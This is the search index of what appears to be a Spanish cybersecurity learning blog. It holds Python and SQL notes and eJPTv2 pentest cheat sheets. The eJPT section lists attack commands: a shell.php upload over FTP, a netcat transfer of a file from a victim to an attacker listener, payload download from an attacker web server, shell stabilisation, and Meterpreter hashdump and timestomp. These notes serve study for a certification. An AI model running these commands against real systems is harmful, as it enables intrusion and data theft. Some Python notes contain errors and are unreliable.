{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Inicio","text":""},{"location":"#blog-de-ciberseguridad","title":"\ud83e\udde0 Blog de Ciberseguridad","text":"<p> Bienvenid@ a mi blog! Este sitio ha sido creado para publicar mi trayectoria y aprendizaje en el campo de la ciberseguridad y el hacking \u00e9tico. Aqu\u00ed ir\u00e9 subiendo tanto documentaci\u00f3n t\u00e9cnica como resoluci\u00f3n de entornos vulnerables (CTF) con el \u00fanico objetivo de documentar mi progreso. </p> <p> Blogs de ciberseguridad hay muchos y \u00e9ste est\u00e1 lejos de aportar nada nuevo. El principial objetivo es trabajar la metodolog\u00eda del reporte y tener un sitio donde mostrar mis avances. Si a pesar de lo anterior, el contenido de este blog puede servir de ayuda a alguien, me encantar\u00e1 saberlo. </p>"},{"location":"#categorias-del-blog","title":"\ud83d\udcc1 Categorias del Blog","text":""},{"location":"#writeups","title":"\ud83d\udd0d Writeups","text":"<p>Documentaci\u00f3n paso a paso de m\u00e1quinas y retos.</p> <p>\u27a1 Ir a writeups</p>"},{"location":"#recursos","title":"\ud83d\udee0\ufe0f Recursos","text":"<p>Herramientas, notas y recursos \u00fatiles para pentesters.</p> <p>\u27a1 Ir a Recursos</p>"},{"location":"#apuntes-y-cheatsheets","title":"\ud83d\udcda Apuntes y Cheatsheets","text":"<p>Atajos, comandos y sintaxis que uso frecuentemente.</p> <p>\u27a1 Ir a documentaci\u00f3n</p>"},{"location":"#ultimas-entradas","title":"\ud83e\uddea \u00daltimas entradas","text":"<ul> <li>\ud83e\uddf1 HTB - SimpleBox (F\u00e1cil) \u2192 [ver writeup]</li> <li>\ud83d\udd75\ufe0f\u200d\u2642\ufe0f TryHackMe - Agent Sudo \u2192 [ver writeup]</li> <li>\ud83d\udcc2 Script: escaneo de red con Nmap \u2192 [ver]</li> </ul> <p> S\u00edgueme en GitHub o encu\u00e9ntrame en LinkedIn. </p>"},{"location":"Apuntes/info/","title":"\ud83d\udcd8 Apuntes","text":"<p>\u201cDocumentar es aprender dos veces.\u201d</p>"},{"location":"Apuntes/info/#curso-de-python","title":"\ud83d\udc0d Curso de Python","text":"<p>\ud83d\udcda Ver Apuntes de Python</p> <p>Fundamentos del lenguaje, notas de varios cursos realizados.</p>"},{"location":"Apuntes/info/#ejpt","title":"\ud83c\udfaf eJPT","text":"<p>\ud83d\udcd8 Ver Apuntes de eJPT</p> <p>Todo lo que estoy estudiando para preparar la certificaci\u00f3n eJPTv2. He creado una lista r\u00e1pida con los comandos y herramientas que m\u00e1s uso.</p>"},{"location":"Apuntes/info/#sql","title":"\ud83d\udc2c SQL","text":"<p>\ud83d\udcd6 Ver Apuntes de SQL</p> <p>Comandos b\u00e1sicos de SQL para gesti\u00f3n de bases de datos</p>"},{"location":"Apuntes/CursoPython/python-course/","title":"Python Course","text":"<p>Strings</p> <pre><code>print(\"String_input\")\n\n# Para variables\n\nnombre= \"Jordi\"\nprint(f\"Hola, me llamo {nombre}\")\n\nOutput: Hola me llamo Jordi\n</code></pre> <p>Entradas de texto, siempre en comillas</p> <p>Formats</p> <pre><code># Newline Character\n\nprint(\"\\\\n\")\n\n# backslash\n\nprint(\"\\\\\\\\\")\n\n# Comilla simple\n\nprint(\"\\\\'\")\n\n# Tabulador\n\nprint(\"\\\\t\")\n\n# Backspace\n\nprint(\"\\\\b\")\n</code></pre> <p>Tipos</p> <p>Defineix el tipus de dada</p> <pre><code>x = 10\nprint (type(x))\nOutput = &lt;class 'ini'&gt;\n</code></pre> <p>Tipos de datos</p> <pre><code>**Integer** = Numeros enteros &gt; x = 4\n**Float** = Numeros decimales &gt; x = 2.5\n</code></pre> <p>Listas</p> <pre><code>example = [1,2,3]\nexample = [1,\"prova\", 10]\n</code></pre> <p>no mutable:</p> <pre><code>example.append (4) &gt; Attributte error\n</code></pre> <p>Ordenar listas</p> <pre><code>example = list{range(0,11)}\nprint (example)\nOutput: [0,1,2,3,4,5,6,7,8,9,10]\n</code></pre> <p>Tuplas</p> <pre><code>example = (1,2,3)\nexample1 = ((\"a\",\"b\",\"c\") , (1,23))\n\nmutable:\n\nexample.append (4) &gt; 1,2,3,4\n</code></pre> <p>Buscar funciones</p> <pre><code>dir(__builtins__)\ndir(list)\ndir(str)\ndir(dict)\n</code></pre> <p>Ayuda funciones</p> <pre><code>help (function)\n</code></pre> <p>Diccionarios</p> <pre><code>example = {'input1':value, 'input2':value, 'input3':value}\n</code></pre> <p>Ex:</p> <pre><code>search_engines_users = {\"google\": 1000, \"bing\": 127000000, \"duck duck go\":12000000}\n\n'google':Key\n'1000': value key\n</code></pre> <p>A\u00f1adir funciones</p> <pre><code>example = [1,2,3,4]\nplus = [5,6]\nexample.append (plus)\nOutput: [1,2,3,4,[5,6]]\n</code></pre> <p>Extender funciones</p> <pre><code>example = [1,2,3,4]\nplus = [5,6]\nexample.extend (plus)\nOutput: [1,2,3,4,5,6]\n\n</code></pre>"},{"location":"Apuntes/CursoPython/python-course/#index","title":"INDEX","text":"<p>Funciones de indice</p> <pre><code>example = ['a','b','c','d']\n\nprint (example[1])\nOutput = ['b']\nprint example[0]\nOutput = ['a']\nprint example [1:3]\nOutput = ['b','c','d']\n</code></pre> <p>Funciones de indice de numero</p> <pre><code>example = ['hola',4,5,6]\nprint example [0]\nOutput: 'hola'\n\nprint example[0][2]\nOutput: 'l'\n\nprint example [1]\nOutput: 4\n</code></pre> <p>Para diccionarios</p> <pre><code>Numbers:\n\nexample = {\"Joan\": 4, \"Marta\": 2, \"Lluna\": 8}\nprint (\"Joan\")\nOutput: 4\n\nStrings:\n\nexample = {\"mati\": \"Sol\", \"tarda\": \"nuvol\", \"nit\": \"pluja\"}\nprint (\"tarda\")\nOutput = 'nuvol'\n</code></pre>"},{"location":"Apuntes/CursoPython/python-course/#conversion","title":"CONVERSION","text":"<p>De tupla a lista</p> <pre><code>1. &gt;&gt;&gt; cool_tuple = (1, 2, 3)\n2. &gt;&gt;&gt; cool_list = list(cool_tuple)\n3. &gt;&gt;&gt;\u00a0cool_list\n4. [1, 2, 3]\n</code></pre> <p>De lista a tupla</p> <pre><code>1. &gt;&gt;&gt; cool_list = [1, 2, 3]\n2. &gt;&gt;&gt; cool_tuple = tuple(cool_list)\n3. &gt;&gt;&gt;\u00a0cool_tuple\n4. (1, 2, 3)\n</code></pre> <p>De string a lista</p> <pre><code>1. &gt;&gt;&gt; cool_string = \"Hello\"\n2. &gt;&gt;&gt; cool_list = list(cool_string)\n3. &gt;&gt;&gt; cool_list\n4. ['H', 'e', 'l', 'l', 'o']\n</code></pre> <p>De lista a string</p> <pre><code>1. &gt;&gt;&gt; cool_list = ['H', 'e', 'l', 'l', 'o']\n2. &gt;&gt;&gt; cool_string = str.join(\"\", cool_list)\n3. &gt;&gt;&gt; cool_string\n4. 'Hello'\n</code></pre> <p>Definicion de funciones</p> <pre><code>def nombre_funcion(parametro1, parametro2, ...):\n\n        # Cuerpo de la funci\u00f3n\n        # C\u00f3digo que ejecutar\u00e1 la funci\u00f3n\n\n    return valor # Opcional, para devolver un resultado\n\n'def':# Palabra clave que indica que est\u00e1s definiendo una funci\u00f3n\n'nombre_funcion:'# El nombre que le das a la funci\u00f3n.\n'parametros:'# Valores que le puedes pasar a la funci\u00f3n para que los use'\n'return:'# (Opcional) La funci\u00f3n puede devolver un valor utilizando `return`. Si no usas `return`, la funci\u00f3n devuelve `None` por defecto.'\n</code></pre> <pre><code>Ex.1\n\ndef saludar(nombre=\"Amigo\"):\n    print(f\"Hola, {nombre}!\")\n\nsaludar() # Salida: Hola, Amigo!\nsaludar(\"Ana\") # Salida: Hola, Ana!\n</code></pre> <p>User Input</p> <pre><code>#Opci\u00f3 1\n\nuser_input = input(\"Posa el teu nom\")\nmissatge = \"Hola %s\" % user_input\nprint (missatge)\n# Posa en el %s el valor de user inmpu\n\n# Per diferents variables:\nnom = input (\"Posa el teu nom:\")\ncognom = input (\"Posa el teu cognom:\")\nmessage = \"Hola %s %s\" % (nom,cognom)\nprint(message)\n\n------------------------------------------------------\n\n# Opci\u00f3 2\nuser_input = input(\"Posa el teu nom\")\nmissatge = f\"Hola {user_input}:\"\nprint (missatge)\n\n# Per diferents variables:\nnom = input (\"Posa el teu nom:\")\ncognom = input (\"Posa el teu cognom:\")\n\nmessage = f\"Hola {nom}{cognom}\"\n\n# Opci\u00f3 3\n\n1. name = \"John\"\n2. surname = \"Smith\"\n\n4. message = \"Your name is {}. Your surname is {}\".format(name, surname)\n5. print(message)\n</code></pre>"},{"location":"Apuntes/CursoPython/python-course/#bucles","title":"BUCLES","text":"<p>Bucle FOR</p> <pre><code>values = [1,2,3,4,5]\nfor valor in values\n    print (valor)\n\n# Ex 1: Simple\n\ncolors = [1,2,3,4,5]\nfor color in colors:\n    print (color)\n# el color , representa los indices de la variable colors. El bucle seria : imprime cada indice (print color) que esta dentro de la variable colors\n\n# Es 2: Usando operadores\n\ncolors = [11, 34.1, 98.2, 43, 45.1, 54, 54]\n\nfor color in colors:\n    if isinstance (color,int) and color &gt; 50 :\n        print (color)\n\n# Se pueden usar operadores para sumar condiciones (AND y OR)\n\n# Ex 3: Llamando a funciones\n\ndef celsius_to_kelvin(cels):\nreturn cels + 273.15 # esto es la formula que converite celsius a kelvin\nfor temperature in [9.1, 8.8, -270.15]: # se pasa una lista de temperaturas\n    print(celsius_to_kelvin(temperature)) # imprime cada item de la lista, pasado por   la funcion celsius_to_kelvin\n\n# Ex 4: Usando diccionarions\n\nnotas_estudiantes = {\"Pol\": 4, \"Joan\": 5, \"Laia\": 8}\n\nfor notas in notas_estudiantes.items():\n    print (notas)\n\nOutput: ('Pol', 4) ('Joan', 5) ('Laia', 8)\n\n# Para mostrar los nombres, usamos el valor \"keys\"\nfor notas in notas_estudiantes.keys():\nOutput: Pol ,Joan, Laia\n\n# Para mostrar las notas, usamos el valor \"values\"\nfor notas in notas_estudiantes.values():\nOutput: 4,5,8\n</code></pre> <pre><code>Uso de FOR en diccionario formateando texto\n\n# Ex 1: Iterando en los indices\n\nphone_numbers = {\"John\": \"+37682929928\", \"Marry\": \"+423998200919\"}\n\nfor pair in phone_numbers.items():\n    print(f\"{pair[0]} has as phone number {pair[1]}\")\n\n# Ex 2: Iterando en las keys y values de la lista\n\nphone_numbers = {\"John\": \"+37682929928\", \"Marry\": \"+423998200919\"}\n\nfor key, value in phone_numbers.items():\n    print(f\"{key} has as phone number {value}\")\n</code></pre> <p>Bucle WHILE</p> <pre><code>a= 3\n\nwhile a &gt; 0:\n    print(1)\n    print(2)\n\nOutput:\n1\n2\n1\n2\n1\n2\n.\n.\n.\n\n# User INPUT example : Va demanant \"Enter username\" fins que coincideixi amb \"marco\"\n\nusername = ''\n\nwhile username != \"marco\":\n    username = input (\"Enter username:\")\n</code></pre>"},{"location":"Apuntes/CursoPython/CheatSheet/Bolean%20Operators/","title":"Bolean Operators","text":"<p>So far, you learned how to check for one single condition:</p> <pre><code>1. x = 1\n\n3. if x == 1:\n4.     print(\"Yes\")\n5. else:\n6.     print(\"No\")\n</code></pre> <p>You can also check if two conditions are met at the same time using an\u00a0<code>and</code>\u00a0operator:</p> <p><pre><code>1. x = 1\n2. y = 1\n\n4. if x == 1 and y==1:\n5.     print(\"Yes\")\n6. else:\n7.     print(\"No\")\n</code></pre>     That will return\u00a0<code>Yes</code>\u00a0since\u00a0<code>x == 1</code>\u00a0and\u00a0<code>y ==1</code>\u00a0are both True.</p> <p>You can also check if one of two conditions are met using an\u00a0<code>or</code>\u00a0operator:</p> <p><pre><code>1. x = 1\n2. y = 1\n\n4. if x == 1 or y==2:\n5.     print(\"Yes\")\n6. else:\n7.     print(\"No\")\n</code></pre>     That will return\u00a0<code>Yes</code>\u00a0since at least one of the conditions is True. In this case\u00a0<code>x == 1</code>\u00a0is True.</p>"},{"location":"Apuntes/CursoPython/CheatSheet/Data%20Types/","title":"Data Types","text":"<p>Integers\u00a0are used to represent whole numbers:</p> <pre><code>1. rank = 10\n2. eggs = 12\n3. people = 3\n</code></pre> <p>Floats\u00a0represent decimal numbers:</p> <pre><code>1. temperature = 10.2\n2. rainfall = 5.98\n3. elevation = 1031.88\n</code></pre> <p>Strings\u00a0represent text:</p> <pre><code>1. message = \"Welcome to our online shop!\"\n2. name = \"John\"\n3. serial = \"R001991981SW\"\n</code></pre> <p>Lists\u00a0represent arrays of values that may change during the course of the program:</p> <pre><code>1. members = [\"Sim Soony\", \"Marry Roundknee\", \"Jack Corridor\"]\n2. pixel_values = [252, 251, 251, 253, 250, 248, 247]\n</code></pre> <p>Dictionaries\u00a0represent pairs of keys and values:</p> <pre><code>1. phone_numbers = {\"John Smith\":\u00a0\"+37682929928\", \"Marry\u00a0Simpons\":\u00a0\"+423998200919\"}\n2. volcano_elevations = {\"Glacier Peak\":\u00a03213.9, \"Rainer\":\u00a04392.1}\n</code></pre> <p>Keys\u00a0of a dictionary can be extracted with:</p> <pre><code>1. phone_numbers.keys()\n</code></pre> <p>Values\u00a0of a dictionary can be extracted with:</p> <pre><code>1. phone_numbers.values()\n</code></pre> <p>Tuples\u00a0represent arrays of values that are not to be changed during the course of the program:</p> <pre><code>1. vowels = ('a', 'e', 'i', 'o', 'u')\n2. one_digits = (0, 1, 2, 3, 4, 5, 6, 7, 8, 9)\n</code></pre> <p>You can get a list of\u00a0attributes\u00a0of a data type has using:</p> <pre><code>1. dir(str)\n2. dir(list)\n3. dir(dict)\n</code></pre> <p>You can get a list of Python\u00a0builtin functions\u00a0using:</p> <pre><code>1. dir(__builtins__)\n</code></pre> <p>You can get the\u00a0documentation\u00a0of a Python data type using:</p> <pre><code>1. help(str)\n2. help(str.replace)\n3. help(dict.values)\n</code></pre>"},{"location":"Apuntes/CursoPython/CheatSheet/Functions%20and%20Conditionals/","title":"Functions And Conditionals","text":"<p>Define\u00a0functions:</p> <pre><code>1. def cube_volume(a):\n2.     return a *\u00a0a *\u00a0a\n</code></pre> <p>Write\u00a0if-else conditionals:</p> <pre><code>1. message = \"hello there\"\n\n3. if \"hello\" in message:\n4.     print(\"hi\")\n5. else:\n6.     print(\"I\u00a0don't understand\")\n</code></pre> <p>Write\u00a0if-elif-else conditionals:</p> <pre><code>1. message = \"hello there\"\n\n3. if \"hello\" in message:\n4.     print(\"hi\")\n5. elif \"hi\" in message:\n6.     print(\"hi\")\n7. elif \"hey\" in message:\n8.     print(\"hi\")\n9. else:\n10.     print(\"I don't understand\")\n</code></pre> <p>Use the\u00a0<code>and</code>\u00a0operator to check if\u00a0both conditions\u00a0are True at the same time:</p> <pre><code>1. x = 1\n2. y = 1\n\n4. if x == 1 and y==1:\n5.     print(\"Yes\")\n6. else:\n7.     print(\"No\")\n</code></pre> <p>Use the\u00a0<code>or</code>\u00a0operator to check if\u00a0at least one condition\u00a0is True:</p> <pre><code>1. x = 1\n2. y = 2\n\n4. if x == 1 or y==2:\n5.     print(\"Yes\")\n6. else:\n7.     print(\"No\")\n</code></pre> <p>Check if a value is of a particular\u00a0type\u00a0with\u00a0isinstance:</p> <pre><code>1. isinstance(\"abc\", str)\n2. isinstance([1, 2, 3], list)\n\nor directly:\n\n1. type(\"abc\") == str\n2. type([1, 2, 3]) == lst\n</code></pre>"},{"location":"Apuntes/CursoPython/CheatSheet/Loops/","title":"Loops","text":"<p>for-loop\u00a0is useful to repeatedly execute a block of code.</p> <pre><code>for letter in 'abc':\n    print(letter.upper())\n\nOutput:\n\n`A   B   C`\n</code></pre> <p>As you can see, the for-loop repeatedly converted all the items of\u00a0<code>'abc'</code>\u00a0to uppercase.</p> <p>The name after\u00a0<code>for</code>\u00a0(e.g.\u00a0<code>letter</code>)\u00a0is just a variable name</p> <p>You can loop over\u00a0dictionary keys\u00a0as follows:</p> <pre><code>phone_numbers = {\"John Smith\":\"+37682929928\",\"Marry Simpons\":\"+423998200919\"}\n   for value in phone_numbers.keys():\n       print(value)\n\nOutput:\n\n`John Smith`  \n`Marry Simpsons`\n</code></pre> <p>You can loop over\u00a0dictionary values:</p> <pre><code>phone_numbers = {\"John Smith\":\"+37682929928\",\"Marry Simpons\":\"+423998200919\"}\n   for value in phone_numbers.values():\n       print(value)\n\nOutput:\n\n`+37682929928`  \n`+423998200919`\n</code></pre> <p>You can loop over\u00a0dictionary items:</p> <pre><code>phone_numbers = {\"John Smith\":\"+37682929928\",\"Marry Simpons\":\"+423998200919\"}\n       for key, value in phone_numbers.items():\n           print(key, value)\n\nOutput:\u00a0\n\nJohn Smith +37682929928\nMarry Simpons +423998200919\n</code></pre> <p>We also have\u00a0while-loops.\u00a0The code under a while-loop will run as long as the while-loop condition is true:</p> <pre><code>while datetime.datetime.now() &lt; datetime.datetime(2090, 8, 20, 19, 30, 20):\n           print(\"It's not yet 19:30:20 of 2090.8.20\")\n\n#The loop above will print out the string inside\u00a0`print()`\u00a0over and over again until the 20th of August, 2090.\n</code></pre>"},{"location":"Apuntes/CursoPython/CheatSheet/Operations%20with%20Data%20Types/","title":"Operations With Data Types","text":"<p>Lists, strings, and tuples have a\u00a0positive index\u00a0system:</p> <pre><code>1. [\"Mon\", \"Tue\", \"Wed\", \"Thu\", \"Fri\", \"Sat\", \"Sun\"]\n2.    0      1      2      3      4      5      6\n</code></pre> <p>And they have a\u00a0negative index\u00a0system as well:</p> <pre><code>1. [\"Mon\", \"Tue\", \"Wed\", \"Thu\", \"Fri\", \"Sat\", \"Sun\"]\n2.   -7     -6     -5     -4     -3     -2     -1\n</code></pre> <p>In a list, the\u00a02nd,\u00a03rd, and\u00a04th\u00a0items can be accessed with:</p> <pre><code>1. days = [\"Mon\", \"Tue\", \"Wed\", \"Thu\", \"Fri\", \"Sat\", \"Sun\"]\n2. days[1:4]\n3. Output: ['Tue', 'Wed', 'Thu']\n</code></pre> <p>First three items of a list:</p> <pre><code>1. days = [\"Mon\", \"Tue\", \"Wed\", \"Thu\", \"Fri\", \"Sat\", \"Sun\"]\n2. days[:3]\n3. Output:['Mon', 'Tue', 'Wed']\u00a0\n</code></pre> <p>Last three items of a list:</p> <pre><code>1. days = [\"Mon\", \"Tue\", \"Wed\", \"Thu\", \"Fri\", \"Sat\", \"Sun\"]\n2. days[-3:]\n3. Output: ['Fri', 'Sat', 'Sun']\n</code></pre> <p>Everything but the last:</p> <pre><code>1. days = [\"Mon\", \"Tue\", \"Wed\", \"Thu\", \"Fri\", \"Sat\", \"Sun\"]\n2. days[:-1]\u00a0\n3. Output:\u00a0['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat']\u00a0\n</code></pre> <p>Everything but the last two:</p> <pre><code>1. days = [\"Mon\", \"Tue\", \"Wed\", \"Thu\", \"Fri\", \"Sat\", \"Sun\"]\n2. days[:-2]\u00a0\n3. Output:\u00a0['Mon', 'Tue', 'Wed', 'Thu', 'Fri']\u00a0\n</code></pre> <p>A dictionary\u00a0value\u00a0can be accessed using its corresponding dictionary\u00a0key:</p> <pre><code>1. phone_numbers = {\"John\":\"+37682929928\",\"Marry\":\"+423998200919\"}\n2. phone_numbers[\"Marry\"]\n3. Output:\u00a0'+423998200919'\n</code></pre>"},{"location":"Apuntes/CursoPython/CheatSheet/User%20Inputs/","title":"User Inputs","text":"<p>The\u00a0input function\u00a0halts the execution of the program and gets text input from the user:</p> <pre><code>1. name = input(\"Enter your name: \")\n</code></pre> <p>The input function converts any\u00a0input to a string, but you can convert it back to int or float:</p> <pre><code>1. experience_months = input(\"Enter your experience in months: \")\n2. experience_years = int(experience_months) / 12\n</code></pre> <p>You can also\u00a0format strings\u00a0with:</p> <pre><code>1. name = \"Sim\"\n2. experience_years = 1.5\n3. print(\"Hi {}, you have {} years of experience\".format(name, experience_years))\n\nOutput:\u00a0`Hi Sim, you have 1.5 years of experience.`\n</code></pre>"},{"location":"Apuntes/SQL/sql/","title":"\ud83d\udcdd SQL","text":"<ul> <li> <p>CREATE : Crear elementos</p> <pre><code>CREATE DATABASE company;\n\n# Create an Index on a Table \n\nCREATE INDEX idx_department ON employees (department);\n\n#CREATE: Create a New Table, Database or Index\n\nCREATE TABLE employees (\n  employee_id INT PRIMARY KEY,\n  first_name VARCHAR(50),\n  last_name VARCHAR(50),\n  department VARCHAR(50),\n  salary DECIMAL(10, 2)\n);\n</code></pre> </li> <li> <p>USE: usar actual</p> <pre><code>USE company;\n</code></pre> </li> <li> <p>ALTER : modificar elementos</p> <pre><code>ALTER DATABASE database_name\n\n#ALTER TABLE: Modify An Existing Table's Structure\n\nALTER TABLE employees\nADD COLUMN new_column INT;\n</code></pre> </li> <li> <p>INSERT INTO: a\u00f1adir elementos</p> <pre><code>INSERT INTO employees (employee_id, first_name, last_name, department, salary)\nVALUES\n  (1, 'John', 'Doe', 'HR', 50000.00),\n  (2, 'Jane', 'Smith', 'IT', 60000.00),\n  (3, 'Alice', 'Johnson', 'Finance', 55000.00),\n  (4, 'Bob', 'Williams', 'IT', 62000.00),\n  (5, 'Emily', 'Brown', 'HR', 48000.00);\n</code></pre> </li> <li> <p>DROP DATABASE: Delete an Existing Database</p> <pre><code>DROP DATABASE company;\n\n#Remove an Index \n\nDROP INDEX IF EXISTS idx_department;\n</code></pre> </li> <li> <p>SELECT: obtener informaci\u00f3n</p> <pre><code>SELECT * FROM employees;\n</code></pre> </li> <li> <p>DISTINCT: Seleccionar valores unicos de una columna</p> <pre><code>SELECT DISTINCT department FROM employees;\n</code></pre> </li> <li> <p>WHERE: Filtra filas segun criterios</p> <pre><code>SELECT * FROM employees WHERE salary &gt; 55000.00;\n</code></pre> </li> <li> <p>LIMIT: Limita el numero de filas segun criterio</p> <pre><code>SELECT * FROM employees LIMIT 3;\n</code></pre> </li> <li> <p>UPDATE: Modifica registros de una tabla</p> <pre><code>UPDATE employees\nSET salary = 55000.00\nWHERE employee_id = 1;\n</code></pre> </li> <li> <p>DELETE: Elimina registros de una tabla</p> <pre><code>DELETE FROM employees\nWHERE employee_id = 5;\n</code></pre> </li> <li> <p>WHERE: Filtra filas segun criterios</p> <pre><code>SELECT * FROM employees\nWHERE department = 'IT';\n</code></pre> </li> <li> <p>LIKE: Busca coincidencias</p> <pre><code>SELECT * FROM employees\nWHERE first_name LIKE 'J%';\n</code></pre> </li> <li> <p>IN: Cualquier coincidencia en la lista</p> <pre><code>SELECT * FROM employees\nWHERE department IN ('HR', 'Finance');\n</code></pre> </li> <li> <p>IS NULL: Busca valores NULL</p> <pre><code>SELECT * FROM employees\nWHERE department IS NULL;\n</code></pre> </li> <li> <p>ORDER BY: Ordena los resultados segun criterio</p> <pre><code>SELECT * FROM employees\nORDER BY salary DESC;\n</code></pre> </li> <li> <p>SUBQUERYS</p> <pre><code># Single Row\n\nSELECT first_name, last_name\nFROM employees\nWHERE salary = (SELECT MAX(salary) FROM employees);\n\n# Multiple Row\n\nSELECT department_name\nFROM departments\nWHERE department_id IN (SELECT department_id FROM employees);\n</code></pre> </li> </ul>"},{"location":"Apuntes/SQL/sql/#_1","title":"Sql","text":""},{"location":"Apuntes/eJPT/MieJPTv2/","title":"Mi eJPTv2","text":""},{"location":"Apuntes/eJPT/MieJPTv2/#basics","title":"Basics","text":"<ul> <li> <p>Curl &amp; Wget</p> <ul> <li> <p>CURL</p> <p>Curl por GET</p> <pre><code>curl -s -X GET \"&lt;http://IP&gt;\"\n</code></pre> <p>CURL cookie setting</p> <pre><code>'Obtenci\u00f3n de cookie y datos:'\n\ncurl -i &lt;http://IP&gt;\n\nOutput:\n\nHTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nDate: Wed, 16 Oct 2024 19:15:03 GMT\nContent-Type: text/html\nContent-Length: 1145\nConnection: keep-alive\nSet-Cookie: THM=Guest; expires=Wed, 16-Oct-2024 20:05:03 GMT; path=/\nVary: Accept-Encoding\n</code></pre> <p>Modificar valor cookie</p> <pre><code>curl -b \"THM=Admin\" '&lt;http://10.10.203.238/challenges/chall2.php&gt;'\n</code></pre> <p>Verificar web</p> <pre><code>curl -s -o /dev/null -w \"%{http_code}\\n\" http://url\n\n-s (silent): Suprime la barra de progreso y los mensajes de error.\n-o /dev/null: Redirige la salida del contenido de la respuesta a /dev/null (b\u00e1sicamente, lo descarta).\n-w \"%{http_code}\\n\": Muestra solo el c\u00f3digo de estado HTTP de la respuesta (por ejemplo, 200 para \u00e9xito, 404 para no encontrado, 500 para error del servidor, etc.).\n</code></pre> </li> <li> <p>WGET</p> <pre><code># Descargar archivo\nwget http://example.com/file\n\n# Descargar archivo renombrado\nwget -O filenmae http://example.com/file\n\n# Descargar mas de un fichero\nwget http://example.com/file1 http://example.com/file2\n\n# Descargar todos los archivos del servidor\nwget -r http://example.com/directory_files\n</code></pre> </li> </ul> </li> <li> <p>Tratamiento TTY</p> <p>1.</p> <pre><code>script /dev/null -c bash\nCTRL + Z\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\nexport SHELL=bash\n</code></pre> </li> <li> <p>Gesti\u00f3n ficheros</p> <ul> <li> <p>Upload</p> <p>Upload files to FTP</p> <pre><code>curl -T shell.php -u \"usuari:password\" ftp://IP_SERVIDOR/CARPETA/fitxer.*\n\nEx:\n\ncurl -T shell.php -u \"anonymous:anonymous\" ftp://172.17.0.3:21/upload/shell.php\n</code></pre> </li> <li> <p>Download</p> <p>Netcat</p> <pre><code># Attack Machine\n nc -lvp 4444 &gt; FiletoDownload\n\n# Victim Machine\nnc 192.168.1.35 4444 -w 3 &lt; FiletoDownload\n</code></pre> <p>Montar un servidor web</p> <pre><code># Attack Machine\npython -m SimpleHTTPServer 8080\npython3 -m http.server 80 (dins de la carpeta on tenim els fitxers)\n\n# Victim Machine\nwget attacker_IP/file\n\nEx: \nwget http://192.168.1.39:8080/FiletoDownload\n</code></pre> <p>SCP</p> <pre><code>#Uploading a file from a local computer to a remote one:\n\nscp /path/to/local/file username@hostname:/path/to/remote/file\n\n#Downloading a file from a remote system to your computer:\n\nscp username@hostname:/path/to/remote/file /path/to/local/file\n</code></pre> </li> </ul> </li> </ul>"},{"location":"Apuntes/eJPT/MieJPTv2/#utils","title":"Utils","text":"<ul> <li> <p>Local Port Forwarding (SSH)</p> <p>Para acceder a un servicio que hay en una maquina remota y que no es accesible desde el exterior, \u00fanicamente desde localhost.  Aplica cuando obtenemos acceso a una maquina y vemos alg\u00fan servicio corriendo solo en local.</p> <pre><code># Victim machine: \n10.129.88.226\n# Service in victim machine visble only on local host\npostgresql \nport 5432\n# User in victim machine : \nChristine (with credentials)\n\n# Attacker machine\nlocalhost\n# Port\n1111\n\nConection:\n\n\n# Use for example port 1111 in this case\n\n\u276f ssh -L 1111:127.0.0.1:5432 christine@10.129.88.226\n\n# Connection with remote postgresql\n\n\u276f psql -h 127.0.0.1 -p 1111 -U christine\n</code></pre> </li> <li> <p>Metasploit</p> <ul> <li> <p>Basic options</p> <ul> <li>Search for module:</li> </ul> <pre><code>msf &gt; search [regex]\n</code></pre> <ul> <li>Specify and exploit to use:</li> </ul> <pre><code>msf &gt; use exploit/[ExploitPath]\n</code></pre> <ul> <li>Specify a Payload to use:</li> </ul> <pre><code>msf &gt; set PAYLOAD [PayloadPath]\n</code></pre> <ul> <li>Show options for the current modules:</li> </ul> <pre><code>msf &gt; show options\n</code></pre> <ul> <li>Set options:</li> </ul> <pre><code>msf &gt; set [Option] [Value]\n</code></pre> <ul> <li>Start exploit:</li> </ul> <pre><code>msf &gt; exploit\n</code></pre> </li> <li> <p>Meterpreter</p> <ul> <li> <p>Base Commands:</p> <ul> <li><code>? / help</code>\u00a0: Display a summary of commands exit / quit: Exit the Meterpreter session</li> <li><code>sysinfo</code>: Show the system name and OS type</li> <li><code>shutdown / reboot</code>\u00a0: Self-explanatory</li> </ul> </li> <li> <p>File System Commands:</p> <ul> <li><code>cd</code>\u00a0: Change directory</li> <li><code>lcd</code>\u00a0: Change directory on local (attacker's) machine</li> <li><code>pwd / getwd</code>\u00a0: Display current working directory</li> <li><code>ls</code>\u00a0: Show the contents of the directory</li> <li><code>cat</code>\u00a0: Display the contents of a file on screen</li> <li><code>download / upload</code>\u00a0: Move files to/from the target machine</li> <li><code>mkdir / rmdir</code>\u00a0: Make / remove directory</li> <li><code>edit</code>\u00a0: Open a file in the default editor (typically vi)</li> </ul> </li> <li> <p>Process Commands:</p> <ul> <li><code>getpid</code>\u00a0: Display the process ID that Meterpreter is running inside.</li> <li><code>getuid</code>\u00a0: Display the user ID that Meterpreter is running with.</li> <li><code>ps</code>\u00a0: Display process list.</li> <li><code>kill</code>\u00a0: Terminate a process given its process ID.</li> <li><code>execute</code>\u00a0: Run a given program with the privileges of the process the Meterpreter is loaded in.</li> <li><code>migrate</code>\u00a0: Jump to a given destination process ID</li> </ul> </li> <li> <p>Network Commands:</p> <ul> <li><code>ipconfig</code>\u00a0: Show network interface information</li> <li><code>portfwd</code>\u00a0: Forward packets through TCP session</li> <li><code>route</code>\u00a0: Manage/view the system's routing table</li> </ul> </li> <li> <p>Other Commands:</p> <ul> <li><code>idletime</code>: Display the duration that the GUI of thetarget machine has been idle.</li> <li><code>uictl [enable/disable] [keyboard/mouse]</code>\u00a0: Enable/disable either the mouse or keyboard of the target machine.</li> <li><code>screenshot</code>\u00a0: Save as an image a screenshot of the target machine.</li> </ul> </li> <li> <p>Additional Modules:</p> <ul> <li><code>use [module]</code>\u00a0: Load the specified module</li> <li>Examples:<ul> <li><code>use priv</code>\u00a0: Load the priv module</li> <li><code>hashdump</code>\u00a0: Dump the hashes from the box</li> <li><code>timestomp</code>\u00a0: Alter NTFS file timestamps</li> </ul> </li> </ul> </li> </ul> </li> <li> <p>Manage Sessions</p> </li> <li> <p>Multiple Exploitation</p> <pre><code>- Run the exploit expecting a single session that is immediately backgrounded:\n\n```bash\nmsf &gt; exploit 